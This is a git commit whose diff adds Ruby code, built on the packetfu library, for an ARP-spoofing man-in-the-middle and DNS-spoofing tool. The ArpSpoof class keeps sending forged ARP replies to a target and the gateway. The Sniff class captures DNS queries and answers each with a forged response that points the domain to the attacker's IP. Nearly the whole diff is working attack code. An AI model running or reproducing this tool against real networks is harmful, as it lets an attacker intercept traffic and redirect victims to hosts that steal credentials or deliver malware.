7f7971731ad36f26ef4aac5f0a6a486cb63a78c9
Warren Voelkl <waren_voelkl@hotmail.com>
2012-07-03 15:28:14 -0700

    prototype working

---
+++ arpSpoof.rb
@@ -0,0 +1,52 @@
+require 'rubygems'
+require 'packetfu'
+
+class ArpSpoof
+    def initialize(config, targetMac, addr, iface)
+        @config = config
+        @targetAddr = addr
+        @targetMac = targetMac
+        @iface = iface
+        @gateway = `ip route show`.match(/default.*/)[0].match(/\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?/)[0]
+        @running = true
+    end
+
+    def start
+
+
+        puts @config[:eth_saddr]
+        puts @config[:eth_daddr]
+        puts @config[:ip_saddr]
+        puts @gateway
+        puts @targetAddr
+        puts
+
+        arp_packet_target = PacketFu::ARPPacket.new()
+        arp_packet_target.eth_saddr = @config[:eth_saddr]       # sender's MAC address
+        arp_packet_target.eth_daddr = @targetMac                # target's MAC address
+        arp_packet_target.arp_saddr_mac = @config[:eth_saddr]   # sender's MAC address
+        arp_packet_target.arp_daddr_mac = @targetMac            # target's MAC address
+        arp_packet_target.arp_saddr_ip = @gateway               # router's IP
+        arp_packet_target.arp_daddr_ip = @targetAddr           # target's IP
+        arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
+
+        # Construct the router's packet
+        arp_packet_router = PacketFu::ARPPacket.new()
+        arp_packet_router.eth_saddr = @config[:eth_saddr]       # sender's MAC address
+        arp_packet_router.eth_daddr = @config[:eth_daddr]       # router's MAC address
+        arp_packet_router.arp_saddr_mac = @config[:eth_saddr]   # sender's MAC address
+        arp_packet_router.arp_daddr_mac = @config[:eth_daddr]   # router's MAC address
+        arp_packet_router.arp_saddr_ip = @targetAddr            # target's IP
+        arp_packet_router.arp_daddr_ip = @gateway               # router's IP
+        arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
+
+        while (@running)
+            arp_packet_target.to_w(@iface)
+            arp_packet_router.to_w(@iface)
+        end
+    end
+
+    def stop
+        @running = false
+    end
+end
--- sniff.rb
+++ sniff.rb
@@ -1,13 +1,22 @@
 require 'rubygems'
 require 'packetfu'
 
+require 'arpSpoof.rb'
+
 include PacketFu
 class Sniff
-	def	intialize()
+        def initialize(addr, iface)
+            @config = Utils.whoami?(:iface => iface)
+            @iface = iface
+            @targetAddr = addr
+            @targetMac = Utils.arp(addr, :iface => iface)
+
 
 	end
 	
 	def start
+                thread = Thread.new { @arpSpoof = ArpSpoof.new(@config, @targetMac, @targetAddr, @iface) ; @arpSpoof.start }
+                puts "WTF"
 		filter = "udp and port 53"
 		cap = Capture.new(:iface => $iface, :start => true, :promisc => true, \
 						  :filter => filter, :save=>true)
@@ -15,13 +24,13 @@ class Sniff
 			@pkt = Packet.parse(p)
 			#check if packet type is query
 			if @pkt.payload[2]  == 1 && @pkt.payload[3]  == 0
-				domainName = getDomainName(@pkt.payload[12..-1])
-				if domainName.nil?
+                                @domainName = getDomainName(@pkt.payload[12..-1])
+                                if @domainName.nil?
 					puts "domainName nil"
 					next
 				end
-				puts "DNS request recieved from: #{domainName}"
-#				transactionId = pkt.payload[0,2]
+                                puts "DNS request recieved for: #{@domainName}"
+                                sendDnsResponce
 			end
 		end
 	end
@@ -40,14 +49,41 @@ private
 		end
 	end
 
-	def genDnsResponce(transactionId, domainName, dst_port, ip_saddr, eth_saddr)
-		
+        def sendDnsResponce()
+            udp_pkt = UDPPacket.new(:config => @config, :udp_src => @pkt.udp_dst, :udp_dst => @pkt.udp_src)
+            udp_pkt.eth_daddr   = @targetMac
+            udp_pkt.ip_daddr    = @targetAddr
+            udp_pkt.ip_saddr    = @pkt.ip_daddr
+            udp_pkt.payload     = @pkt.payload[0,2]
+            udp_pkt.payload     += "\x81"+"\x80"+"\x00"+"\x01"+"\x00"+"\x01"+"\00"
+            udp_pkt.payload     += "\x00"+"\x00"+"\x00"
+
+            @domainName.split('.').each do |str|
+                udp_pkt.payload += str.length.chr
+                udp_pkt.payload += str
+            end
+            udp_pkt.payload     += "\x00"+"\x00"+"\x01"+"\x00"+"\x01"+"\xc0"
+            udp_pkt.payload     += "\x0c"+"\x00"+"\x01"+"\x00"+"\x01"
+            #TTL
+            udp_pkt.payload     += "\x00"+"\x00"+"\x02"+"\x56"
+            #data length
+            udp_pkt.payload     += "\x00"+"\x04"
+
+            ipstr = @config[:ip_saddr].split('.')
+            udp_pkt.payload     += [ipstr[0].to_i, ipstr[1].to_i, ipstr[2].to_i, ipstr[3].to_i].pack('C*')
+
+
+            udp_pkt.recalc
+
+            #Thread.new { 10000.times {udp_pkt.to_w(@iface) } }
+            udp_pkt.to_w(@iface)
+            #udp_pkt.to_f("output")
 	end
 
 end
 
 def test
-	sniff = Sniff.new
+        sniff = Sniff.new("192.168.0.1", "em1")
 	sniff.start
 end
 
